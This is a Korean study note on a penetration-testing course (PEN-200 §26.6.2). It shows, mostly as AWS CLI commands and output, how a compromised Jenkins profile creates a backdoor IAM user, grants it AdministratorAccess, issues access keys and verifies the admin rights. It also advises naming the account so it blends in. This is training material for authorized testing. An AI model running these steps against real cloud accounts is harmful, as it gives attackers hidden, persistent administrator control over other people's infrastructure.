# 26.6.2 백도어 계정 생성

> **Creating a Backdoor Account** · PEN-200 §26.6.2

`jenkins-admin` 을 계속 쓰는 대신 별도 계정을 발판으로 삼음. 탈취 프로파일(`--profile CompromisedJenkins`) 로 `iam create-user` 를 호출함.

⚠️ 예시라 이름이 `backdoor` 지만 실제 계약에서는 `terraform-admin` 같이 **주변에 섞이는 이름**을 고를 것.

```
kali@kali:~$ aws --profile CompromisedJenkins iam create-user --user-name backdoor
{
    "User": {
        "Path": "/",
        "UserName": "backdoor",
        "UserId": "AIDAUBHUBEGIPX2SBIHLB",
        "Arn": "arn:aws:iam::274737132808:user/backdoor",
    }
}
```

*백도어 사용자 생성 — 아직 정책이 붙지 않은 상태*

권한은 AWS 관리형 `AdministratorAccess` 를 `iam attach-user-policy` 로 붙여 부여함(`--user-name` + 정책 ARN).

```
kali@kali:~$ aws --profile CompromisedJenkins iam attach-user-policy  --user-name
backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
kali@kali:~$
```

*관리형 관리자 정책 연결 — 성공 시 출력이 없음*

계정만으로는 API 를 못 쓰므로 `iam create-access-key` 로 키를 발급.

```
kali@kali:~$ aws --profile CompromisedJenkins iam create-access-key --user-name
backdoor
{
    "AccessKey": {
        "UserName": "backdoor",
        "AccessKeyId": "[REDACTED-AWS-KEY-ID]",
        "Status": "Active",
        "SecretAccessKey": "[REDACTED-AWS-SECRET]",
    }
}
```

*발급된 자격 증명 — 시크릿 키는 이때만 반환됨*

새 키를 별도 프로파일로 등록하고 `iam list-attached-user-policies` 로 정책이 붙었는지 확인함.

```
kali@kali:~$ aws configure --profile=backdoor
AWS Access Key ID [None]: [REDACTED-AWS-KEY-ID]
AWS Secret Access Key [None]: [REDACTED-AWS-SECRET]
Default region name [None]: us-east-1
Default output format [None]:
kali@kali:~$ aws --profile backdoor iam list-attached-user-policies --user-name
backdoor
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

*새 프로파일로 자기 정책을 조회해 관리자 권한 확인*

결과 — 대상 계정 내 **전권 관리자 권한**과 장기 접근용 백도어 사용자를 동시에 갖게 됨. 다음은 클라우드 자원 장악의 다른 벡터인 의존성 체인 악용임.
